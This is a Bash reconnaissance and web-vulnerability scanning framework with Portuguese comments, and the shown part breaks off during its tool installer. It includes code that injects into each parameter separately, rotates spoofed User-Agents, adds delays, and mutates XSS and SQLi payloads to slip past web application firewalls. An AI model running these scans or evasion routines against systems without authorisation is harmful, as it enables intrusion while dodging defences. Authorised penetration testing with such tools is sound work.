#!/bin/bash

# ============================================================
#  RECON.SH — Full Automated Reconnaissance Framework v1.0
#  ⚠  USE APENAS EM SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA ⚠
#  Uso: ./recon.sh <dominio> [opções]
#  Exemplo: ./recon.sh alvo.com
#           ./recon.sh alvo.com --threads 200 --deep
#           ./recon.sh --install          # auto-instala todas as ferramentas
# ============================================================
# CHANGELOG v1.0 (vs v0.6 // originalmente v6.0):
#
#  FEAT auto_install() — instala TODAS as ferramentas automaticamente
#       com log em tempo real: Go, pip, apt. Usar: ./recon.sh --install
#
#  FEAT retry_curl() — retry com backoff exponencial (padrão: 3 tentativas)
#       Substitui cfetch/cfetch_headers nos pontos críticos.
#       Configurável via --retry <n>
#
#  FEAT random_ua() — rotação de User-Agent aleatório a cada request
#       (9 UAs reais: Chrome, Firefox, Edge, Safari, mobile, bots)
#
#  FEAT jitter() — delay aleatório (100-400ms) entre requests
#       Ativado automaticamente se WAF detectado ou via --jitter
#
#  FEAT mutate_payload() — variação de encoding/case por payload
#       XSS: HTMLentity/case/null-byte/confirm. SQLi: case/space/pipe
#       Reduz fingerprint de payloads previsíveis detectados por WAF
#
#  FEAT cleanup_trap() — trap SIGINT/SIGTERM para saída limpa
#       Mata background jobs, exibe resumo parcial, preserva outputs
#
#  FIX  check_deps: ferramentas opcionais ausentes não mais param o script
#       silenciosamente — agora logam via log_err e continuam
#
#  FIX  uro: agora com fallback se params_raw.txt estiver vazio (não quebra)
#
#  FIX  step_graphql: here-doc Python com variáveis isoladas (sem injection)
#
#  FIX  step_xss header: hardcoded head -n 20 substituído por limit_waf
#
#  FIX  subshells xargs: variáveis exportadas corretamente (_ua, _retry)
#
#  FIX  retry_cfetch_headers: substitui cfetch_headers nos steps críticos
#
# ============================================================
# CHANGELOG v5.0 (vs v4.0):
#
#  FIX  declare -A header_resps declarado fora do loop while (step_xss 15b)
#  FIX  POST body SQLi: payload agora serializado via json.dumps (sem injeção de quote)
#  FIX  SSTI encoding: usa sys.argv[1] em vez de interpolação direta na string Python
#  FIX  Blind SQLi baseline: mediana de 3 amostras + dupla confirmação (reduz FP)
#  FIX  WAF detection: hardcoded head -n 10/20 → usa limit_waf configurável
#
#  PERF inject_per_param() — injeta payload em CADA parâmetro individualmente,
#       não em todos ao mesmo tempo. Pinpoints qual param é vulnerável.
#  PERF cfetch() — único curl retorna status + body (elimina chamadas duplas)
#  PERF url_encode() — encapsula python3 urllib.parse com sys.argv (sem quoting bugs)
#  PERF step_sensitive: xargs -P paralelo (até 30x mais rápido)
#  PERF step_cors:      xargs -P paralelo
#  PERF step_headers:   xargs -P paralelo
#  PERF step_idor:      cfetch() elimina chamada dupla por URL testada
#
#  PAYLOADS inject_per_param() usada em: XSS 15a, SQLi 16a/16b, LFI, Redirect,
#            SSTI, CRLF — cada parâmetro testado isoladamente
# ============================================================

# ============================================================
# CORES E ESTILOS
# ============================================================
RED='\033[0;31m'
LRED='\033[1;31m'
GREEN='\033[0;32m'
LGREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
LBLUE='\033[1;34m'
MAGENTA='\033[0;35m'
LMAGENTA='\033[1;35m'
CYAN='\033[0;36m'
LCYAN='\033[1;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# ============================================================
# BANNER
# ============================================================
banner() {
  clear
  echo -e "${LCYAN}"
  echo "  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗"
  echo "  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║"
  echo "  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║"
  echo "  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║"
  echo "  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║"
  echo "  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝"
  echo -e "${NC}"
  echo -e "  ${DIM}Full Automated Reconnaissance Framework v1.0${NC}"
  echo -e "  ${LRED}⚠  USE APENAS EM SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA ⚠${NC}"
  echo -e "  ${DIM}─────────────────────────────────────────────${NC}"
  echo
}

# ============================================================
# CONFIGURAÇÕES PADRÃO
# ============================================================
domain=""
threads=100
deep_mode=false
skip_scans=false
skip_screenshots=false
verbose=false
timeout=10
rate_limit=50
max_sqli=30
max_dalfox_workers=30
gau_threads=10
katana_depth=3
scan_start=0
anthropic_api_key=""

# v1.0 — Resiliência e WAF Evasion
max_retries=3
retry_delay=1
jitter_mode=false
waf_evasion=true
install_mode=false

# Limites configuráveis
limit_cors=50
limit_headers=30
limit_sensitive=20
limit_lfi=30
limit_redirect=30
limit_js_endpoints=100
limit_js_secrets=50
limit_ffuf=20
limit_arjun=20
limit_idor=30
limit_crlf=30
limit_xss_manual=50
limit_waf=20
curl_delay=0

# ── v1.0 Novas funcionalidades ────────────────────────────────
shodan_api_key=""
adaptive_mode=true           # Inteligência adaptativa: muda estratégia com base na resposta do alvo
scan_profile="normal"        # normal | stealth | aggressive
endpoint_scoring=true        # Priorização inteligente de endpoints por risco
passive_intel=true           # Recon passivo: crt.sh, ASN, BGP, etc.
noise_reduction=true         # Reduz padrões detectáveis (shuffle, burst spacing)
burst_pause=0                # Pausa entre bursts de requests (seg); 0 = auto

# Flags de ferramentas opcionais
HAS_GOWITNESS=false
HAS_NAABU=false
HAS_SUBZY=false
HAS_ARJUN=false
HAS_FFUF=false
HAS_TRUFFLEHOG=false
HAS_ASSETFINDER=false
HAS_AMASS=false
HAS_FINDOMAIN=false
HAS_GHAURI=false
HAS_WAFW00F=false
HAS_INTERACTSH=false
HAS_NOSQLMAP=false
HAS_PYTHON3=false
WAF_DETECTED=false

# ============================================================
# PARSE DE ARGUMENTOS
# ============================================================
parse_args() {
  # Modo instalação: ./recon.sh --install (sem domínio)
  if [[ "${1:-}" == "--install" ]]; then
    install_mode=true
    return
  fi

  if [[ -z "$1" ]]; then
    echo -e "${RED}Erro: domínio não informado.${NC}"
    echo
    echo -e "  ${BOLD}Uso:${NC} ./recon.sh <dominio> [opções]"
    echo -e "       ./recon.sh --install        # instala todas as ferramentas"
    echo
    echo -e "  ${BOLD}Opções:${NC}"
    echo -e "    --threads <n>         Número de threads (padrão: 100)"
    echo -e "    --deep                Modo profundo"
    echo -e "    --skip-scans          Pula dalfox, sqlmap e nuclei"
    echo -e "    --no-screenshots      Pula screenshots"
    echo -e "    --verbose             Output completo"
    echo -e "    --api-key <key>       Chave Anthropic API (para AI triage)"
    echo -e "    --retry <n>           Tentativas curl (padrão: 3)"
    echo -e "    --jitter              Ativa delays aleatórios (anti-WAF)"
    echo -e "    --no-waf-evasion      Desativa mutação de payloads"
    echo -e "    --shodan-key <key>    Chave Shodan para passive intel"
    echo -e "    --no-adaptive         Desativa inteligência adaptativa (WAF auto-tuning)"
    echo -e "    --no-passive-intel    Desativa crt.sh, ASN, BGP recon"
    echo -e "    --no-scoring          Desativa priorização de endpoints por risco"
    echo -e "    --stealth             Perfil stealth (delays maiores, menos requests)"
    echo -e "    --aggressive          Perfil agressivo (máxima cobertura)"
    echo -e "    --limit-cors <n>      (padrão: 50)"
    echo -e "    --limit-headers <n>   (padrão: 30)"
    echo -e "    --limit-sensitive <n> (padrão: 20)"
    echo -e "    --limit-lfi <n>       (padrão: 30)"
    echo -e "    --limit-redirect <n>  (padrão: 30)"
    echo -e "    --limit-idor <n>      (padrão: 30)"
    echo -e "    --limit-crlf <n>      (padrão: 30)"
    echo -e "    --limit-waf <n>       Hosts para WAF detection (padrão: 20)"
    echo -e "    --curl-delay <s>      Delay entre requests curl (padrão: 0)"
    echo
    exit 1
  fi

  domain="$1"
  shift

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --threads)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--threads deve ser inteiro${NC}"; exit 1; }
        threads="$2"; shift 2 ;;
      --deep)             deep_mode=true;          shift   ;;
      --skip-scans)       skip_scans=true;         shift   ;;
      --no-screenshots)   skip_screenshots=true;   shift   ;;
      --verbose)          verbose=true;            shift   ;;
      --api-key)          anthropic_api_key="$2";  shift 2 ;;
      --limit-cors)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-cors deve ser inteiro${NC}"; exit 1; }
        limit_cors="$2"; shift 2 ;;
      --limit-headers)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-headers deve ser inteiro${NC}"; exit 1; }
        limit_headers="$2"; shift 2 ;;
      --limit-sensitive)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-sensitive deve ser inteiro${NC}"; exit 1; }
        limit_sensitive="$2"; shift 2 ;;
      --limit-lfi)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-lfi deve ser inteiro${NC}"; exit 1; }
        limit_lfi="$2"; shift 2 ;;
      --limit-redirect)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-redirect deve ser inteiro${NC}"; exit 1; }
        limit_redirect="$2"; shift 2 ;;
      --limit-idor)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-idor deve ser inteiro${NC}"; exit 1; }
        limit_idor="$2"; shift 2 ;;
      --limit-crlf)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-crlf deve ser inteiro${NC}"; exit 1; }
        limit_crlf="$2"; shift 2 ;;
      --limit-waf)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--limit-waf deve ser inteiro${NC}"; exit 1; }
        limit_waf="$2"; shift 2 ;;
      --curl-delay)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--curl-delay deve ser inteiro${NC}"; exit 1; }
        curl_delay="$2"; shift 2 ;;
      --retry)
        [[ "$2" =~ ^[0-9]+$ ]] || { echo -e "${RED}--retry deve ser inteiro${NC}"; exit 1; }
        max_retries="$2"; shift 2 ;;
      --jitter)            jitter_mode=true;        shift   ;;
      --no-waf-evasion)    waf_evasion=false;       shift   ;;
      --shodan-key)        shodan_api_key="$2";     shift 2 ;;
      --no-adaptive)       adaptive_mode=false;     shift   ;;
      --no-passive-intel)  passive_intel=false;     shift   ;;
      --no-scoring)        endpoint_scoring=false;  shift   ;;
      --stealth)           scan_profile="stealth";  shift   ;;
      --aggressive)        scan_profile="aggressive"; shift  ;;
      *) shift ;;
    esac
  done

  if [[ "$deep_mode" == "true" ]]; then
    katana_depth=5
    gau_threads=20
    max_sqli=60
    limit_cors=200
    limit_headers=100
    limit_sensitive=100
    limit_lfi=100
    limit_redirect=100
    limit_js_endpoints=300
    limit_js_secrets=200
    limit_ffuf=50
    limit_arjun=50
    limit_idor=60
    limit_crlf=60
    limit_xss_manual=150
    limit_waf=50
  fi
}

# ============================================================
# ESTRUTURA DE PASTAS
# ============================================================
setup_dirs() {
  local timestamp
  timestamp=$(date '+%Y-%m-%d_%H-%M-%S')
  scan_dir="${domain}_${timestamp}"

  DIR_ROOT="$scan_dir"
  DIR_DISC="$scan_dir/01_discovery"
  DIR_URLS="$scan_dir/02_urls"
  DIR_PARAMS="$scan_dir/03_params"
  DIR_VULNS="$scan_dir/04_vulns"
  DIR_SCANS="$scan_dir/05_scans"
  DIR_SHOTS="$scan_dir/06_screenshots"
  DIR_JS="$scan_dir/07_js"
  DIR_EXTRA="$scan_dir/08_extra"
  DIR_REPORT="$scan_dir/09_report"

  mkdir -p \
    "$DIR_DISC" \
    "$DIR_URLS" \
    "$DIR_PARAMS" \
    "$DIR_VULNS" \
    "$DIR_SCANS/sqli_output" \
    "$DIR_SHOTS" \
    "$DIR_JS" \
    "$DIR_EXTRA" \
    "$DIR_REPORT"

  log_file="$DIR_ROOT/recon.log"
  error_log="$DIR_ROOT/errors.log"
  touch "$log_file" "$error_log"
}

# ============================================================
# LOGGER
# ============================================================
_ts()     { date '+%H:%M:%S'; }
log()     { echo -e "${CYAN}[$(_ts)]${NC} ${WHITE}$1${NC}"        | tee -a "$log_file"; }
success() { echo -e "${LGREEN}[$(_ts)] ✔${NC} ${GREEN}$1${NC}"    | tee -a "$log_file"; }
warn()    { echo -e "${YELLOW}[$(_ts)] ⚠${NC} ${YELLOW}$1${NC}"   | tee -a "$log_file"; }
error()   { echo -e "${LRED}[$(_ts)] ✘${NC} ${RED}$1${NC}"        | tee -a "$log_file"; }
info()    { echo -e "${LBLUE}[$(_ts)] ℹ${NC} ${BLUE}$1${NC}"      | tee -a "$log_file"; }
log_err() { echo "[$(_ts)] $1" >> "$error_log"; }

section() {
  echo | tee -a "$log_file"
  echo -e "${LMAGENTA}[$(_ts)] ══════════════════════════════════════${NC}" | tee -a "$log_file"
  echo -e "${LMAGENTA}[$(_ts)]  $1${NC}"                                    | tee -a "$log_file"
  echo -e "${LMAGENTA}[$(_ts)] ══════════════════════════════════════${NC}" | tee -a "$log_file"
}

count()    { [[ -f "$1" ]] && wc -l < "$1" || echo 0; }
is_empty() { [[ ! -f "$1" ]] || [[ $(count "$1") -eq 0 ]]; }
safe_cat() { [[ -f "$1" ]] && cat "$1" || echo "(nenhum resultado)"; }
curl_throttle() { [[ "$curl_delay" -gt 0 ]] && sleep "$curl_delay"; }

# ============================================================
# HELPERS DE PERFORMANCE — v5.0
# ============================================================

# url_encode STR
# Encoda string para URL via python3 com sys.argv (sem bugs de quoting)
url_encode() {
  python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1],safe=''))" "$1" 2>/dev/null \
    || printf '%s' "$1"
}

# cfetch URL OUTFILE
# Único curl retorna status; corpo gravado em OUTFILE.
# Elimina o padrão de 2 chamadas curl (uma para status, outra para body).
cfetch() {
  curl -sk --max-time "$timeout" -o "$2" -w "%{http_code}" "$1" 2>/dev/null
}

# cfetch_headers URL OUTFILE
# Mesmo que cfetch mas retorna apenas cabeçalhos (-I).
cfetch_headers() {
  curl -sk --max-time "$timeout" -o "$2" -w "%{http_code}" -I "$1" 2>/dev/null
}

# inject_per_param URL ENCODED_PAYLOAD
# ─────────────────────────────────────────────────────────────
# Substitui o valor de CADA parâmetro individualmente e imprime
# uma URL de teste por linha.
#
# Motivação: em vez de injetar em TODOS os parâmetros ao mesmo
# tempo (sed "s|=[^&]*|=$p|g"), testamos cada parâmetro isolado.
# Isso:
#  • Identifica exatamente qual parâmetro é vulnerável
#  • Reduz falsos positivos de respostas "ruidosas"
#  • Evita padrões multi-param que WAFs detectam mais facilmente
#
# Exemplo: URL "?a=1&b=2", payload "FUZZ"
#  → https://host/?a=FUZZ&b=2
#  → https://host/?a=1&b=FUZZ
inject_per_param() {
  local url="$1" payload="$2"
  local base qs

  # URL sem parâmetros — devolve como está
  if [[ "$url" != *"?"* ]]; then
    echo "$url"
    return
  fi

  base="${url%%\?*}"
  qs="${url#*\?}"

  local -a params
  IFS='&' read -ra params <<< "$qs"
  local n=${#params[@]}

  local i
  for (( i=0; i<n; i++ )); do
    local name="${params[$i]%%=*}"
    [[ -z "$name" ]] && continue
    local -a rebuilt=()
    local j
    for (( j=0; j<n; j++ )); do
      if [[ $j -eq $i ]]; then
        rebuilt+=("${params[$j]%%=*}=${payload}")
      else
        rebuilt+=("${params[$j]}")
      fi
    done
    local joined
    printf -v joined '%s&' "${rebuilt[@]}"
    echo "${base}?${joined%&}"
  done
}

# ============================================================
# v1.0 — TRAP: saída limpa em SIGINT/SIGTERM
# ============================================================
_TRAP_FIRED=false
cleanup_trap() {
  [[ "$_TRAP_FIRED" == "true" ]] && return
  _TRAP_FIRED=true
  echo
  echo -e "${YELLOW}[$(_ts)] ⚠ Sinal recebido — encerrando graciosamente...${NC}" 2>/dev/null || true
  jobs -p 2>/dev/null | xargs -r kill 2>/dev/null || true
  if [[ -n "${scan_dir:-}" ]] && [[ -d "${scan_dir:-}" ]]; then
    echo -e "${YELLOW}[$(_ts)] ⚠ Outputs parciais preservados em: $scan_dir${NC}" 2>/dev/null || true
  fi
  exit 130
}
trap cleanup_trap SIGINT SIGTERM

# ============================================================
# v1.0 — RANDOM USER-AGENT
# ============================================================
random_ua() {
  local _uas=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.2478.80 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
  )
  echo "${_uas[$(( RANDOM % ${#_uas[@]} ))]}"
}

# ============================================================
# v1.0 — JITTER: delay aleatório anti-WAF
# ============================================================
jitter() {
  if [[ "$jitter_mode" == "true" ]] || [[ "${WAF_DETECTED:-false}" == "true" ]]; then
    local _ms=$(( (RANDOM % 350) + 80 ))
    sleep "0.${_ms}" 2>/dev/null || sleep 1
  fi
}

# ============================================================
# v1.0 — RETRY_CURL: retry + backoff exponencial + UA rotation
# Assinatura: retry_curl OUTFILE URL [extra_curl_args...]
# Retorna HTTP status code; body gravado em OUTFILE
# ============================================================
retry_curl() {
  local _out="$1" _url="$2"; shift 2
  local _attempt=0 _wait="$retry_delay" _status="000"
  while [[ $_attempt -lt $max_retries ]]; do
    _status=$(curl -sk --max-time "$timeout" \
      -A "$(random_ua)" \
      -o "$_out" \
      -w "%{http_code}" \
      "$@" \
      "$_url" 2>/dev/null)
    local _exit=$?
    if [[ $_exit -eq 0 ]] && [[ "$_status" != "000" ]]; then
      echo "$_status"; return 0
    fi
    _attempt=$(( _attempt + 1 ))
    if [[ $_attempt -lt $max_retries ]]; then
      [[ -n "${error_log:-}" ]] && \
        echo "[$(date '+%H:%M:%S')] retry_curl tentativa $_attempt falhou para $_url (status=$_status)" >> "$error_log"
      sleep "$_wait"
      _wait=$(( _wait * 2 ))
    fi
    jitter
  done
  [[ -n "${error_log:-}" ]] && \
    echo "[$(date '+%H:%M:%S')] retry_curl FALHA DEFINITIVA após $max_retries tentativas para $_url" >> "$error_log"
  echo "000"; return 1
}

# retry_cfetch URL OUTFILE — retry-aware cfetch
retry_cfetch() {
  retry_curl "$2" "$1"
}

# retry_cfetch_headers URL OUTFILE — retry-aware cfetch_headers
retry_cfetch_headers() {
  retry_curl "$2" "$1" -I
}

# ============================================================
# v1.0 — PAYLOAD MUTATION (anti-WAF fingerprint)
# ============================================================
mutate_xss() {
  [[ "$waf_evasion" != "true" ]] && echo "$1" && return
  local p="$1"
  case $(( RANDOM % 6 )) in
    0) echo "$p" ;;
    1) echo "$p" | sed 's/alert/confirm/gI; s/script/sCrIpT/gI' ;;
    2) echo "$p" | sed 's/onerror/onmouseover/gI' ;;
    3) python3 -c "
import sys,random
p=sys.argv[1]; out=''
for c in p:
    out+=('&#'+str(ord(c))+';' if c.isalpha() and random.random()<0.35 else c)
print(out)" "$p" 2>/dev/null || echo "$p" ;;
    4) echo "$p" | sed 's/alert(/top[\"alert\"](./' ;;
    5) echo "$p" | sed 's/<script/<sc\nript/gI' ;;
  esac
}

mutate_sqli() {
  [[ "$waf_evasion" != "true" ]] && echo "$1" && return
  local p="$1"
  case $(( RANDOM % 5 )) in
    0) echo "$p" ;;
    1) echo "$p" | sed 's/ /\/**\//g; s/SELECT/SeLeCt/gI; s/UNION/UniOn/gI' ;;
    2) echo "$p" | sed 's/ /+/g' ;;
    3) echo "$p" | sed 's/ OR / || /gI; s/ AND / && /gI' ;;
    4) echo "$p" | sed 's/--$/-- -/; s/1=1/2=2/g' ;;
  esac
}

# ============================================================
# v1.0 — AUTO-INSTALL DE FERRAMENTAS (./recon.sh --install)
# ============================================================
auto_install() {
  local _ilog="$PWD/recon_install_$(date '+%Y%m%d_%H%M%S').log"

  # Banner (não usa section() pois log_file ainda não existe)
  echo -e "${LCYAN}"
  echo "  ╔══════════════════════════════════════════════════════════════╗"
  echo "  ║         RECON v1.0 — AUTO-INSTALL DE FERRAMENTAS           ║"
  echo "  ╚══════════════════════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  ${DIM}Log completo em tempo real: ${CYAN}${_ilog}${NC}"
  echo
  > "$_ilog"

  _iok()  { echo -e "${LGREEN}[$(date '+%H:%M:%S')] ✔${NC} ${GREEN}$1${NC}";  echo "[OK ] $1" >> "$_ilog"; }
  _ierr() { echo -e "${LRED}[$(date '+%H:%M:%S')] ✘${NC} ${RED}$1${NC}";      echo "[ERR] $1" >> "$_ilog"; }
  _iinf() { echo -e "${LBLUE}[$(date '+%H:%M:%S')] ℹ${NC} ${BLUE}$1${NC}";   echo "[INF] $1" >> "$_ilog"; }
  _irun() { echo -e "${YELLOW}[$(date '+%H:%M:%S')] ▶${NC} ${YELLOW}$1${NC}"; echo "[RUN] $1" >> "$_ilog"; }

  # ── Detecta gerenciador de pacotes ────────────────────────────
  local PKG=""
  command -v apt-get &>/dev/null && PKG="apt"
  command -v yum     &>/dev/null && [[ -z "$PKG" ]] && PKG="yum"
  command -v pacman  &>/dev/null && [[ -z "$PKG" ]] && PKG="pacman"
  command -v brew    &>/dev/null && [[ -z "$PKG" ]] && PKG="brew"
  _iinf "Gerenciador de pacotes detectado: ${PKG:-desconhecido}"

  # ── Dependências de sistema ───────────────────────────────────
  _irun "Instalando dependências base do sistema (curl git make gcc wget unzip python3 python3-pip)..."
  case "$PKG" in
    apt)
      sudo apt-get update -qq  >> "$_ilog" 2>&1 || true
      sudo apt-get install -y -qq curl git make gcc wget unzip python3 python3-pip >> "$_ilog" 2>&1 \
        && _iok "Dependências base instaladas (apt)" || _ierr "Algumas dependências base falharam (apt)"
      _irun "Instalando sqlmap via apt..."
      sudo apt-get install -y -qq sqlmap >> "$_ilog" 2>&1 \
        && _iok "sqlmap instalado (apt)" || _ierr "sqlmap apt falhou — tentando pip..."
      ;;
    yum)
      sudo yum install -y -q curl git make gcc wget unzip python3 python3-pip >> "$_ilog" 2>&1 \
        && _iok "Dependências base instaladas (yum)" || _ierr "Falha parcial (yum)"
      sudo yum install -y -q sqlmap >> "$_ilog" 2>&1 \
        && _iok "sqlmap instalado (yum)" || _ierr "sqlmap yum falhou"
      ;;
    pacman)
      sudo pacman -S --noconfirm --needed curl git make gcc wget unzip python python-pip >> "$_ilog" 2>&1 \
        && _iok "Dependências base instaladas (pacman)" || _ierr "Falha parcial (pacman)"
      ;;
    brew)
      brew install curl git make wget python >> "$_ilog" 2>&1 \
        && _iok "Dependências base instaladas (brew)" || _ierr "Falha parcial (brew)"
      ;;
    *)
      _ierr "Gerenciador de pacotes não detectado — instale manualmente: curl git make gcc wget unzip python3 python3-pip sqlmap"
      ;;
  esac

  # ── Instalação do Go ──────────────────────────────────────────
  echo
  _irun "Verificando Go language..."
  if ! command -v go &>/dev/null; then
    local GO_VER="1.22.3"
    local GO_OS="linux"; [[ "$(uname -s)" == "Darwin" ]] && GO_OS="darwin"
    local GO_ARCH="amd64"
    [[ "$(uname -m)" == "arm64" || "$(uname -m)" == "aarch64" ]] && GO_ARCH="arm64"
    local GO_TAR="go${GO_VER}.${GO_OS}-${GO_ARCH}.tar.gz"
    local GO_URL="https://go.dev/dl/${GO_TAR}"

    _irun "Baixando Go ${GO_VER} (${GO_OS}/${GO_ARCH})..."
    _iinf "URL: $GO_URL"
    if wget --progress=bar:force "$GO_URL" -O "/tmp/${GO_TAR}" >> "$_ilog" 2>&1; then
      sudo rm -rf /usr/local/go
      sudo tar -C /usr/local -xzf "/tmp/${GO_TAR}" >> "$_ilog" 2>&1
      export PATH="$PATH:/usr/local/go/bin"
      grep -q '/usr/local/go/bin' ~/.bashrc 2>/dev/null || echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
      grep -q '/usr/local/go/bin' ~/.zshrc  2>/dev/null || echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.zshrc 2>/dev/null || true
      rm -f "/tmp/${GO_TAR}"
      _iok "Go ${GO_VER} instalado → $(command -v go 2>/dev/null || echo '/usr/local/go/bin/go')"
    else
      _ierr "Falha no download do Go — verifique conexão. URL: $GO_URL"
    fi
  else
    _iok "Go já instalado → $(go version)"
  fi

  export GOPATH="${GOPATH:-$HOME/go}"
  local GOBIN="$GOPATH/bin"
  export PATH="$PATH:$GOBIN"
  mkdir -p "$GOBIN"
  grep -q "go/bin" ~/.bashrc 2>/dev/null || echo "export PATH=\$PATH:$GOBIN" >> ~/.bashrc

  # ── Instalador de ferramenta Go ───────────────────────────────
  _install_go() {
    local _name="$1" _pkg="$2"
    if command -v "$_name" &>/dev/null; then
      _iok "$_name já instalado → $(command -v "$_name")"; return 0
    fi
    _irun "[$_name] go install $_pkg"
    if go install "$_pkg" >> "$_ilog" 2>&1; then
      if command -v "$_name" &>/dev/null; then
        _iok "$_name instalado → $(command -v "$_name")"
      else
        _iok "$_name compilado → $GOBIN/$_name"
      fi
    else
      _ierr "$_name FALHOU — veja: $_ilog"
    fi
  }

  # ── Ferramentas Go obrigatórias ───────────────────────────────
  echo
  _iinf "══════ Ferramentas Go (obrigatórias) ══════"
  _install_go "subfinder"         "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
  _install_go "httpx"             "github.com/projectdiscovery/httpx/cmd/httpx@latest"
  _install_go "waybackurls"       "github.com/tomnomnom/waybackurls@latest"
  _install_go "gau"               "github.com/lc/gau/v2/cmd/gau@latest"
  _install_go "katana"            "github.com/projectdiscovery/katana/cmd/katana@latest"
  _install_go "gf"                "github.com/tomnomnom/gf@latest"
  _install_go "qsreplace"         "github.com/tomnomnom/qsreplace@latest"
  _install_go "dalfox"            "github.com/hahwul/dalfox/v2@latest"
  _install_go "nuclei"            "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
  _install_go "interactsh-client" "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"

  # ── Ferramentas Go opcionais ──────────────────────────────────
  echo
  _iinf "══════ Ferramentas Go (opcionais) ══════"
  _install_go "gowitness"   "github.com/sensepost/gowitness@latest"
  _install_go "naabu"       "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
  _install_go "subzy"       "github.com/PentestPad/subzy@latest"
  _install_go "ffuf"        "github.com/ffuf/ffuf/v2@latest"
  _install_go "assetfinder" "github.com/tomnomnom/assetfinder@latest"
  _install_go "trufflehog"  "github.com/trufflesecurity/trufflehog/v3@latest"

  # ── Instalador pip ────────────────────────────────────────────
  _install_pip() {
    local _name="$1" _pkg="${2:-$1}"
    if command -v "$_name" &>/dev/null; then
      _iok "$_name já instalado"; return 0
    fi
    _irun "[$_name] pip3 install $_pkg --break-system-packages"
    if pip3 install "$_pkg" --break-system-packages --quiet >> "$_ilog" 2>&1; then
      _iok "$_name instalado via pip"
    else
      _ierr "$_name pip falhou"
    fi
  }

  # ── Ferramentas Python ────────────────────────────────────────
  echo
  _iinf "══════ Ferramentas Python ══════"
  _install_pip "uro"     "uro"
  _install_pip "arjun"   "arjun"
  _install_pip "wafw00f" "wafw00f"
  _install_pip "ghauri"  "ghauri"

  # ── GF Patterns ───────────────────────────────────────────────
  echo
  _iinf "══════ GF Patterns ══════"
  local GF_DIR="$HOME/.gf"
  mkdir -p "$GF_DIR"
  local _gf_count; _gf_count=$(ls "$GF_DIR"/*.json 2>/dev/null | wc -l)
  if [[ "$_gf_count" -lt 5 ]]; then
    _irun "Clonando Gf-Patterns (1ndianl33t)..."
    local _tmp_gf; _tmp_gf=$(mktemp -d)
    if git clone -q https://github.com/1ndianl33t/Gf-Patterns "$_tmp_gf" >> "$_ilog" 2>&1; then
      cp "$_tmp_gf"/*.json "$GF_DIR/" 2>/dev/null && _iok "GF Patterns instalados em $GF_DIR ($(ls "$GF_DIR"/*.json | wc -l) patterns)"
    else
      _ierr "Falha ao clonar Gf-Patterns"
    fi
    rm -rf "$_tmp_gf"
  else
    _iok "GF Patterns já presentes em $GF_DIR ($_gf_count patterns)"
  fi

  # ── Nuclei templates ──────────────────────────────────────────
  echo
  _iinf "══════ Nuclei Templates ══════"
  if command -v nuclei &>/dev/null; then
    _irun "Atualizando nuclei templates..."
    nuclei -update-templates -silent >> "$_ilog" 2>&1 \
      && _iok "Nuclei templates atualizados" || _ierr "nuclei update-templates falhou"
  else
    _ierr "nuclei não encontrado — instale acima e rode novamente"
  fi

  # ── Wordlists (seclists) ──────────────────────────────────────
  echo
  _iinf "══════ Wordlists (SecLists) ══════"
  if [[ ! -d "/usr/share/seclists" ]]; then
    _irun "Instalando SecLists..."
    if [[ "$PKG" == "apt" ]]; then
      sudo apt-get install -y -qq seclists >> "$_ilog" 2>&1 \
        && _iok "SecLists instalado via apt" && : || {
          _irun "apt falhou — clonando via git (pode demorar)..."
          git clone -q --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists >> "$_ilog" 2>&1 \
            && _iok "SecLists clonado via git" || _ierr "SecLists git falhou"
        }
    else
